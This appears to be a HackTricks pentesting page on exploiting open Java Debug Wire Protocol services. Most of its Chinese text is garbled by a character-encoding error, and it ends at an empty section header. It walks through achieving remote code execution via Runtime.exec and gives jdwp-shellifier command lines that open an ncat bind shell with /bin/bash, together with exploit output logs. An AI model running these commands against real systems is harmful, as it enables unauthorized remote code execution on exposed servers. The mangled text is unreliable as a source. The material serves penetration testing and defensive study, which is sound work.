# Pentesting JDWP - Java Debug Wire Protocol

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœæ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸Šçœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è·å–**PEASSæœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ã€‚
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Exploiting

JDWPåˆ©ç”¨ä¾èµ–äº**åè®®ç¼ºä¹è®¤è¯å’ŒåŠ å¯†**ã€‚å®ƒé€šå¸¸å‡ºç°åœ¨**ç«¯å£8000**ä¸Šï¼Œä½†ä¹Ÿå¯èƒ½ä½¿ç”¨å…¶ä»–ç«¯å£ã€‚é€šè¿‡å‘ç›®æ ‡ç«¯å£å‘é€"JDWP-Handshake"æ¥å»ºç«‹åˆå§‹è¿æ¥ã€‚å¦‚æœJDWPæœåŠ¡å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œå®ƒä¼šä»¥ç›¸åŒçš„å­—ç¬¦ä¸²å“åº”ï¼Œç¡®è®¤å…¶å­˜åœ¨ã€‚è¿™ç§æ¡æ‰‹ä½œä¸ºä¸€ç§æŒ‡çº¹è¯†åˆ«æ–¹æ³•ï¼Œç”¨äºè¯†åˆ«ç½‘ç»œä¸Šçš„JDWPæœåŠ¡ã€‚

åœ¨è¿›ç¨‹è¯†åˆ«æ–¹é¢ï¼Œæœç´¢Javaè¿›ç¨‹ä¸­çš„å­—ç¬¦ä¸²"jdwk"å¯ä»¥æŒ‡ç¤ºä¸€ä¸ªæ´»åŠ¨çš„JDWPä¼šè¯ã€‚

é¦–é€‰å·¥å…·æ˜¯[jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°ï¼š
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
æˆ‘å‘ç°ä½¿ç”¨ `--break-on 'java.lang.String.indexOf'` å¯ä»¥ä½¿æ¼æ´åˆ©ç”¨æ›´åŠ **ç¨³å®š**ã€‚å¦‚æœä½ æœ‰æœºä¼šä¸Šä¼ ä¸€ä¸ªåé—¨åˆ°ä¸»æœºå¹¶æ‰§è¡Œå®ƒï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæ¼æ´åˆ©ç”¨å°†ä¼šæ›´åŠ ç¨³å®šã€‚

## æ›´å¤šç»†èŠ‚

**æ‘˜è‡ª** [**https://ioactive.com/hacking-java-debug-wire-protocol-or-how/**](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)

### **Java è°ƒè¯•çº¿åè®®**

**Java å¹³å°è°ƒè¯•æ¶æ„ (JPDA)**ï¼šJDWP æ˜¯å…¨å±€ Java è°ƒè¯•ç³»ç»Ÿçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œç§°ä¸º Java å¹³å°è°ƒè¯•æ¶æ„ (JPDA)\[2]ã€‚ä»¥ä¸‹æ˜¯æ•´ä½“æ¶æ„çš„å›¾è¡¨ï¼š

[![](https://ioactive.com/wp-content/uploads/2014/04/jdpa.png)](https://ioactive.com/wp-content/uploads/2014/04/jdpa-1.png)

è¢«è°ƒè¯•å¯¹è±¡ç”±è¿è¡Œç›®æ ‡åº”ç”¨ç¨‹åºçš„å¤šçº¿ç¨‹ JVM ç»„æˆã€‚ä¸ºäº†èƒ½å¤Ÿè¿œç¨‹è°ƒè¯•ï¼Œå¿…é¡»åœ¨å‘½ä»¤è¡Œä¸Šæ˜¾å¼åœ°ä½¿ç”¨ -Xdebug é€‰é¡¹å¯åŠ¨ JVM å®ä¾‹ï¼Œä»¥åŠ -Xrunjdwpï¼ˆæˆ– -agentlibï¼‰é€‰é¡¹ã€‚ä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªå¯ç”¨äº†è¿œç¨‹è°ƒè¯•çš„ Tomcat æœåŠ¡å™¨ï¼Œçœ‹èµ·æ¥åƒè¿™æ ·ï¼š

[![](https://ioactive.com/wp-content/uploads/2014/04/tomat.png)](https://ioactive.com/wp-content/uploads/2014/04/tomat-1.png)

å¦‚æ¶æ„å›¾æ‰€ç¤ºï¼ŒJava è°ƒè¯•çº¿åè®®æ˜¯è°ƒè¯•å™¨å’Œ JVM å®ä¾‹ä¹‹é—´çš„ä¸­å¿ƒé“¾æ¥ã€‚å…³äºåè®®çš„è§‚å¯ŸåŒ…æ‹¬ï¼š

* å®ƒæ˜¯ä¸€ä¸ªåŸºäºæ•°æ®åŒ…çš„ç½‘ç»œäºŒè¿›åˆ¶åè®®ã€‚
* å®ƒä¸»è¦æ˜¯åŒæ­¥çš„ã€‚è°ƒè¯•å™¨é€šè¿‡ JDWP å‘é€å‘½ä»¤å¹¶æœŸæœ›æ”¶åˆ°å›å¤ã€‚ç„¶è€Œï¼ŒæŸäº›å‘½ä»¤ï¼Œå¦‚äº‹ä»¶ï¼Œä¸æœŸæœ›åŒæ­¥å“åº”ã€‚å®ƒä»¬ä¼šåœ¨ç‰¹å®šæ¡ä»¶æ»¡è¶³æ—¶å‘é€å›å¤ã€‚ä¾‹å¦‚ï¼Œæ–­ç‚¹å°±æ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚
* å®ƒä¸ä½¿ç”¨è®¤è¯ã€‚
* å®ƒä¸ä½¿ç”¨åŠ å¯†ã€‚

æ‰€æœ‰è¿™äº›è§‚å¯Ÿéƒ½æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºæˆ‘ä»¬è®¨è®ºçš„æ˜¯ä¸€ä¸ªè°ƒè¯•åè®®ã€‚ç„¶è€Œï¼Œå½“è¿™æ ·çš„æœåŠ¡æš´éœ²åœ¨æ•Œå¯¹ç½‘ç»œä¸­ï¼Œæˆ–é¢å‘äº’è”ç½‘æ—¶ï¼Œæƒ…å†µå¯èƒ½ä¼šå‡ºé”™ã€‚\
\
**æ¡æ‰‹**ï¼šJDWP è§„å®š\[9]é€šä¿¡å¿…é¡»é€šè¿‡ä¸€ä¸ªç®€å•çš„æ¡æ‰‹æ¥å¯åŠ¨ã€‚åœ¨æˆåŠŸçš„ TCP è¿æ¥åï¼Œè°ƒè¯•å™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰å‘é€ 14 ä¸ªå­—ç¬¦çš„ ASCII å­—ç¬¦ä¸² â€œJDWP-Handshakeâ€ã€‚è¢«è°ƒè¯•å¯¹è±¡ï¼ˆæœåŠ¡å™¨ï¼‰é€šè¿‡å‘é€å®Œå…¨ç›¸åŒçš„å­—ç¬¦ä¸²æ¥å“åº”æ­¤æ¶ˆæ¯ã€‚ä»¥ä¸‹ scapy\[3] è·Ÿè¸ªæ˜¾ç¤ºäº†æœ€åˆçš„åŒå‘æ¡æ‰‹ï¼š

root:\~/tools/scapy-hg # ip addr show dev eth0 | grep â€œinet â€œ inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0root:\~/tools/scapy-hg # ./run\_scapy

æ¬¢è¿ä½¿ç”¨ Scapy (2.2.0-dev)\
**>>>** sniff(filter=â€tcp port 8000 and host 192.168.2.9â€³, count=8)\
\<Sniffed: TCP:9 UDP:1 ICMP:0 Other:0>\
**>>>** tcp.hexraw()\
0000 15:49:30.397814 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 S\
0001 15:49:30.402445 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 SA\
0002 15:49:30.402508 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\
0003 15:49:30.402601 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0004 15:49:30.407553 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0005 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0006 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0007 15:49:30.407636 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A

ä¸€ä¸ªæœ‰ç»éªŒçš„å®‰å…¨å®¡è®¡å‘˜å¯èƒ½å·²ç»æ„è¯†åˆ°ï¼Œè¿™æ ·ä¸€ä¸ªç®€å•çš„æ¡æ‰‹æä¾›äº†ä¸€ç§è½»æ¾å‘ç°äº’è”ç½‘ä¸Šæ´»è·ƒ JDWP æœåŠ¡çš„æ–¹æ³•ã€‚åªéœ€å‘é€ä¸€ä¸ªç®€å•çš„æ¢é’ˆå¹¶æ£€æŸ¥ç‰¹å®šçš„å“åº”ã€‚æ›´æœ‰è¶£çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ ShodanHQ\[4] æ‰«ææ—¶è§‚å¯Ÿåˆ° IBM Java å¼€å‘å·¥å…·åŒ…çš„è¡Œä¸ºï¼ŒæœåŠ¡å™¨é¦–å…ˆä½¿ç”¨å‰é¢æåˆ°çš„ç›¸åŒæ¨ªå¹…â€œè¯´è¯â€ã€‚å› æ­¤ï¼Œæœ‰ä¸€ç§å®Œå…¨è¢«åŠ¨çš„æ–¹å¼æ¥å‘ç°æ´»è·ƒçš„ JDWP æœåŠ¡ï¼ˆæœ¬æ–‡åé¢å°†åˆ©ç”¨è‘—åçš„ Shodan æ¥ä»‹ç»è¿™ä¸€ç‚¹ï¼‰ã€‚\
\
**é€šä¿¡**ï¼šJDWP å®šä¹‰äº†è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•å¯¹è±¡ä¹‹é—´é€šä¿¡æ‰€æ¶‰åŠçš„æ¶ˆæ¯\[10]ã€‚æ¶ˆæ¯éµå¾ªä¸€ä¸ªç®€å•çš„ç»“æ„ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š&#x20;

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/createstring.png" alt=""><figcaption></figcaption></figure>

Length å’Œ Id å­—æ®µç›¸å½“è‡ªè§£é‡Šã€‚Flag å­—æ®µä»…ç”¨äºåŒºåˆ†è¯·æ±‚åŒ…å’Œå›å¤åŒ…ï¼Œ0x80 çš„å€¼è¡¨ç¤ºå›å¤åŒ…ã€‚CommandSet å­—æ®µå®šä¹‰äº†å‘½ä»¤çš„ç±»åˆ«ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\
\\

| **CommandSet** | \*\* Command\*\*                                                                                                 |
| -------------- | ---------------------------------------------------------------------------------------------------------------- |
| 0x40           | JVM åº”é‡‡å–çš„è¡ŒåŠ¨ï¼ˆä¾‹å¦‚ï¼Œè®¾ç½®æ–­ç‚¹ï¼‰                                                                               |
| 0x40â€“0x7F      | å‘è°ƒè¯•å™¨æä¾›äº‹ä»¶ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼ŒJVM å·²ç»è§¦å‘æ–­ç‚¹å¹¶ç­‰å¾…è¿›ä¸€æ­¥æ“ä½œï¼‰                                                   |
| 0x80           | ç¬¬ä¸‰æ–¹æ‰©å±•                                                                                                       |

è€ƒè™‘åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»¥ä¸‹å‘½ä»¤å¯¹æˆ‘ä»¬çš„ç›®çš„æ¥è¯´æœ€æœ‰è¶£ã€‚

* VirtualMachine/IDSizes å®šä¹‰ JVM å¤„ç†çš„æ•°æ®ç»“æ„çš„å¤§å°ã€‚è¿™æ˜¯ nmap è„šæœ¬ jdwp-exec.nse\[11] ä¸å·¥ä½œçš„åŸå› ä¹‹ä¸€ï¼Œå› ä¸ºè„šæœ¬ä½¿ç”¨äº†ç¡¬ç¼–ç çš„å¤§å°ã€‚
* ClassType/InvokeMethod å…è®¸ä½ è°ƒç”¨ä¸€ä¸ªé™æ€å‡½æ•°ã€‚
* ObjectReference/InvokeMethod å…è®¸ä½ è°ƒç”¨ JVM ä¸­å®ä¾‹åŒ–å¯¹è±¡çš„å‡½æ•°ã€‚
* StackFrame/(Get|Set)Values æä¾›çº¿ç¨‹æ ˆçš„æ¨/å¼¹åŠŸèƒ½ã€‚
* Event/Composite å¼ºåˆ¶ JVM å¯¹æ­¤å‘½ä»¤å£°æ˜çš„ç‰¹å®šè¡Œä¸ºåšå‡ºååº”ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯è°ƒè¯•ç›®çš„çš„ä¸»è¦å…³é”®ï¼Œå› ä¸ºå®ƒå…è®¸åœ¨è¿è¡Œæ—¶è®¾ç½®æ–­ç‚¹ã€å•æ­¥æ‰§è¡Œçº¿ç¨‹ï¼Œå¹¶åœ¨è®¿é—®/ä¿®æ”¹å€¼æ—¶ä»¥ä¸ GDB æˆ– WinDBG å®Œå…¨ç›¸åŒçš„æ–¹å¼å¾—åˆ°é€šçŸ¥ã€‚

JDWP ä¸ä»…å…è®¸ä½ è®¿é—®å’Œè°ƒç”¨å·²ç»å­˜åœ¨äºå†…å­˜ä¸­çš„å¯¹è±¡ï¼Œå®ƒè¿˜å…è®¸ä½ åˆ›å»ºæˆ–è¦†ç›–æ•°æ®ã€‚

* VirtualMachine/CreateString å…è®¸ä½ å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆå­˜åœ¨äº JVM è¿è¡Œæ—¶çš„ java.lang.Stringã€‚
* VirtualMachine/RedefineClasses å…è®¸ä½ å®‰è£…æ–°çš„ç±»å®šä¹‰ã€‚

**â€œæ‰€æœ‰çš„ JDWP éƒ½å±äºæˆ‘ä»¬â€**

æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼ŒJDWP æä¾›äº†å†…ç½®å‘½ä»¤ï¼Œå°†ä»»æ„ç±»åŠ è½½åˆ° JVM å†…å­˜ä¸­å¹¶è°ƒç”¨å·²ç»å­˜åœ¨å’Œ/æˆ–æ–°åŠ è½½çš„å­—èŠ‚ç ã€‚ä»¥ä¸‹éƒ¨åˆ†å°†ä»‹ç»ç”¨ Python åˆ›å»ºåˆ©ç”¨ä»£ç çš„æ­¥éª¤ï¼Œè¯¥ä»£ç çš„è¡Œä¸ºç±»ä¼¼äº JDI å‰ç«¯çš„éƒ¨åˆ†å®ç°ï¼Œä»¥ä¾¿å°½å¯èƒ½å¯é ã€‚ç‹¬ç«‹çš„æ¼æ´åˆ©ç”¨è„šæœ¬çš„ä¸»è¦åŸå› æ˜¯ï¼Œä½œä¸ºä¸€åæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæˆ‘å–œæ¬¢â€œä¸€å‡»å¿…æ€â€çš„æ¼æ´åˆ©ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ç¡®ä¿¡ä¸€ä¸ªç¯å¢ƒ/åº”ç”¨ç¨‹åº/åè®®æ˜¯è„†å¼±çš„æ—¶ï¼Œæˆ‘å¸Œæœ›ç«‹å³å‡†å¤‡å¥½æˆ‘çš„å·¥å…·æ¥åˆ©ç”¨å®ƒï¼ˆå³ä¸æ˜¯ä»…ä»…å­˜åœ¨çš„æ¦‚å¿µéªŒè¯ï¼‰ã€‚æ‰€ä»¥ç°åœ¨æˆ‘ä»¬å·²ç»ä»‹ç»äº†ç†è®ºï¼Œè®©æˆ‘ä»¬è¿›å…¥å®é™…å®ç°ã€‚é¢å¯¹ä¸€ä¸ªå¼€æ”¾çš„ JDWP æœåŠ¡ï¼Œä»»æ„å‘½ä»¤æ‰§è¡Œåªéœ€äº”ä¸ªæ­¥éª¤ï¼ˆæˆ–è€…ä½¿ç”¨è¿™ä¸ªæ¼æ´ï¼Œåªéœ€ä¸€ä¸ªå‘½ä»¤è¡Œï¼‰ã€‚ä»¥ä¸‹æ˜¯æ“ä½œæ­¥éª¤ï¼š1. è·å– Java è¿è¡Œæ—¶å¼•ç”¨JVM é€šè¿‡å®ƒä»¬çš„å¼•ç”¨æ¥æ“ä½œå¯¹è±¡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨å¿…é¡»é¦–å…ˆè·å– java.lang.Runtime ç±»çš„å¼•ç”¨ã€‚ä»è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ getRuntime() æ–¹æ³•çš„å¼•ç”¨ã€‚è¿™æ˜¯é€šè¿‡è·å–æ‰€æœ‰ç±»ï¼ˆAllClasses åŒ…ï¼‰å’Œæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼ˆReferenceType/Methods åŒ…ï¼‰æ¥å®Œæˆçš„ã€‚2. è®¾ç½®æ–­ç‚¹å¹¶ç­‰å¾…é€šçŸ¥ï¼ˆå¼‚æ­¥è°ƒç”¨ï¼‰è¿™æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„å…³é”®ã€‚ä¸ºäº†è°ƒç”¨ä»»æ„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¿è¡Œä¸­çš„çº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­ã€‚ä¸ºæ­¤ï¼Œä¸€ä¸ªæŠ€å·§æ˜¯åœ¨è¿è¡Œæ—¶å·²çŸ¥ä¼šè¢«è°ƒç”¨çš„æ–¹æ³•ä¸Šè®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚å¦‚å‰æ‰€è¿°ï¼ŒJDI ä¸­çš„æ–­ç‚¹æ˜¯ä¸€ä¸ªå¼‚æ­¥äº‹ä»¶ï¼Œå…¶ç±»å‹è®¾ç½®ä¸º BREAKPOINT(0x02)ã€‚å½“è§¦å‘æ—¶ï¼ŒJVM å‘æˆ‘ä»¬çš„è°ƒè¯•å™¨å‘é€ä¸€ä¸ª EventData åŒ…ï¼ŒåŒ…å«æˆ‘ä»¬çš„æ–­ç‚¹ IDï¼Œæ›´é‡è¦çš„æ˜¯ï¼ŒåŒ…å«è§¦å‘å®ƒçš„çº¿ç¨‹çš„å¼•ç”¨ã€‚\
\


<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/event_break.png" alt=""><figcaption></figcaption></figure>

å› æ­¤ï¼Œå°†å®ƒè®¾ç½®åœ¨ä¸€ä¸ªç»å¸¸è¢«è°ƒç”¨çš„æ–¹æ³•ä¸Šæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œä¾‹å¦‚ java.net.ServerSocket.accept()ï¼Œæ¯æ¬¡æœåŠ¡å™¨æ¥æ”¶åˆ°æ–°çš„ç½‘ç»œè¿æ¥æ—¶éƒ½å¾ˆå¯èƒ½è¢«è°ƒç”¨ã€‚ç„¶è€Œï¼Œå¿…é¡»è®°ä½ï¼Œå®ƒå¯ä»¥æ˜¯è¿è¡Œæ—¶å­˜åœ¨çš„ä»»ä½•æ–¹æ³•ã€‚3. åœ¨è¿è¡Œæ—¶åˆ†é…ä¸€ä¸ª Java String å¯¹è±¡æ¥æ‰§è¡Œæœ‰æ•ˆè½½è·æˆ‘ä»¬å°†åœ¨ JVM è¿è¡Œæ—¶æ‰§è¡Œä»£ç ï¼Œå› æ­¤æˆ‘ä»¬æ“ä½œçš„æ‰€æœ‰æ•°æ®ï¼ˆä¾‹å¦‚å­—ç¬¦ä¸²ï¼‰å¿…é¡»å­˜åœ¨äº JVM è¿è¡Œæ—¶ï¼ˆå³æ‹¥æœ‰ä¸€ä¸ªè¿è¡Œæ—¶å¼•ç”¨ï¼‰ã€‚è¿™é€šè¿‡å‘é€ä¸€ä¸ª CreateString å‘½ä»¤æ¥è½»æ¾å®Œæˆã€‚

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/Untitled.png" alt=""><figcaption></figcaption></figure>

4\. ä»æ–­ç‚¹ä¸Šä¸‹æ–‡è·å– Runtime å¯¹è±¡æ­¤æ—¶æˆ‘ä»¬å‡ ä¹æ‹¥æœ‰äº†æˆåŠŸã€å¯é åˆ©ç”¨æ‰€éœ€çš„æ‰€æœ‰å…ƒç´ ã€‚æˆ‘ä»¬ç¼ºå°‘çš„æ˜¯ä¸€ä¸ª Runtime å¯¹è±¡å¼•ç”¨ã€‚è·å–å®ƒå¾ˆå®¹æ˜“ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°åœ¨ JVM è¿è¡Œæ—¶æ‰§è¡Œ java.lang.Runtime.getRuntime() é™æ€æ–¹æ³•\[8]ï¼Œé€šè¿‡å‘é€ä¸€ä¸ª ClassType/InvokeMethod åŒ…å¹¶æä¾› Runtime ç±»å’Œçº¿ç¨‹å¼•ç”¨ã€‚5. æŸ¥æ‰¾å¹¶è°ƒç”¨ Runtime å®ä¾‹ä¸­çš„ exec() æ–¹æ³•æœ€åä¸€æ­¥å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨å‰ä¸€æ­¥è·å¾—çš„ Runtime é™æ€å¯¹è±¡ä¸­æŸ¥æ‰¾ exec() æ–¹æ³•å¹¶è°ƒç”¨å®ƒï¼ˆé€šè¿‡å‘é€ä¸€ä¸ª ObjectReference/InvokeMethod åŒ…ï¼‰ä¸æˆ‘ä»¬åœ¨ç¬¬ä¸‰æ­¥åˆ›å»ºçš„ String å¯¹è±¡ã€‚&#x20;

<figure><img src="https://ioactive.com/wp-content/uploads/2014/04/exec.png" alt=""><figcaption></figcaption></figure>

Et voilÃ  !! å¿«é€Ÿä¸”ç®€å•ã€‚ä½œä¸ºæ¼”ç¤ºï¼Œè®©æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå¯ç”¨äº† JPDA â€œè°ƒè¯•æ¨¡å¼â€çš„ Tomcatï¼š

root@pwnbox:\~/apache-tomcat-6.0.39# ./bin/catalina.sh jpda start

æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„è„šæœ¬ï¼Œä¸å¸¦å‘½ä»¤æ¥æ‰§è¡Œï¼Œåªæ˜¯ä¸ºäº†ç®€å•åœ°è·å–ä¸€èˆ¬çš„ç³»ç»Ÿä¿¡æ¯ï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.9
[+] Targeting â€˜192.168.2.9:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) 64-Bit Server VM â€“ 1.6.0_65â€™
[+] Found Runtime class: id=466[+] Found Runtime.getRuntime(): id=7facdb6a8038
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™## Here we wait for breakpoint to be triggered by a new connection ##
[+] Received matching event from thread 0x8b0
[+] Found Operating System â€˜Mac OS Xâ€™
[+] Found User name â€˜pentestosxâ€™
[+] Found ClassPath â€˜/Users/pentestosx/Desktop/apache-tomcat-6.0.39/bin/bootstrap.jarâ€™
[+] Found User home directory â€˜/Users/pentestosxâ€™
[!] Command successfully executed
```
ç›¸åŒçš„å‘½ä»¤è¡Œï¼Œä½†é’ˆå¯¹Windowsç³»ç»Ÿï¼Œå¹¶åœ¨ä¸€ä¸ªå®Œå…¨ä¸åŒçš„æ–¹æ³•ä¸Šä¸­æ–­ï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“break-on â€˜java.lang.String.indexOfâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) Client VM â€“ 1.7.0_51â€™
[+] Found Runtime class: id=593
[+] Found Runtime.getRuntime(): id=17977a9c
[+] Created break event id=2
[+] Waiting for an event on â€˜java.lang.String.indexOfâ€™
[+] Received matching event from thread 0x8f5
[+] Found Operating System â€˜Windows 7â€™
[+] Found User name â€˜hugsyâ€™
[+] Found ClassPath â€˜C:UsershugsyDesktopapache-tomcat-6.0.39binbootstrap.jarâ€™
[+] Found User home directory â€˜C:Usershugsyâ€™
[!] Command successfully executed
```
æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„exploitæ¥ç”Ÿæˆä¸€ä¸ªbind shellï¼Œpayloadä¸ºâ€œncat -e /bin/bash -l -p 1337â€ï¼Œé’ˆå¯¹Linuxç³»ç»Ÿï¼š
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“cmd â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜OpenJDK Client VM â€“ 1.6.0_27â€™
[+] Found Runtime class: id=79d
[+] Found Runtime.getRuntime(): id=8a1f5e0
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™
[+] Received matching event from thread 0x82a[+] Selected payload â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Command string object created id:82b
[+] Runtime.getRuntime() returned context id:0x82c
[+] found Runtime.exec(): id=8a1f5fc[+] Runtime.exec() successful, retId=82d
[!] Command successfully executed Success, we now have a listening socket!
root@pwnbox:~/apache-tomcat-6.0.39# netstat -ntpl | grep 1337
tcp        0      0 0.0.0.0:1337         0.0.0.0:*               LISTEN      19242/ncat
tcp6       0      0 :::1337              :::*                    LISTEN      19242/ncat
```
æœ€ç»ˆçš„åˆ©ç”¨æŠ€æœ¯ä½¿ç”¨äº†è¿™äº›æŠ€æœ¯ï¼Œå¢åŠ äº†ä¸€äº›æ£€æŸ¥ï¼Œå¹¶å‘é€æŒ‚èµ·/æ¢å¤ä¿¡å·ä»¥å°½å¯èƒ½å‡å°‘å¹²æ‰°ï¼ˆä¸ç ´åæ‚¨æ­£åœ¨å·¥ä½œçš„åº”ç”¨ç¨‹åºæ€»æ˜¯æœ€å¥½çš„ï¼Œå¯¹å§ï¼Ÿï¼‰ã€‚å®ƒæœ‰ä¸¤ç§æ¨¡å¼ï¼š

* â€œé»˜è®¤â€æ¨¡å¼å®Œå…¨ä¸ä¾µå…¥æ€§ï¼Œåªæ˜¯æ‰§è¡ŒJavaä»£ç ä»¥è·å–æœ¬åœ°ç³»ç»Ÿä¿¡æ¯ï¼ˆéå¸¸é€‚åˆå‘å®¢æˆ·å±•ç¤ºæ¦‚å¿µéªŒè¯ï¼‰ã€‚
* ä¼ é€’â€œcmdâ€é€‰é¡¹åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå› æ­¤æ›´å…·ä¾µå…¥æ€§ã€‚å‘½ä»¤æ˜¯ä»¥JVMè¿è¡Œçš„æƒé™å®Œæˆçš„ã€‚

æ­¤åˆ©ç”¨è„šæœ¬å·²æˆåŠŸæµ‹è¯•å¯¹æŠ—ï¼š

* Oracle Java JDK 1.6 å’Œ 1.7
* OpenJDK 1.6
* IBM JDK 1.6

ç”±äºJavaæœ¬è´¨ä¸Šæ˜¯å¹³å°æ— å…³çš„ï¼Œå› æ­¤å¯ä»¥åœ¨Javaæ”¯æŒçš„ä»»ä½•æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚è¿™å®é™…ä¸Šå¯¹æˆ‘ä»¬æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´æ˜¯ä¸ªå¥½æ¶ˆæ¯ï¼š**å¼€æ”¾çš„JDWPæœåŠ¡æ„å‘³ç€å¯é çš„RCE**ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¸€åˆ‡é¡ºåˆ©ã€‚

### **ç°å®ç”Ÿæ´»ä¸­çš„åˆ©ç”¨æƒ…å†µå¦‚ä½•ï¼Ÿ**

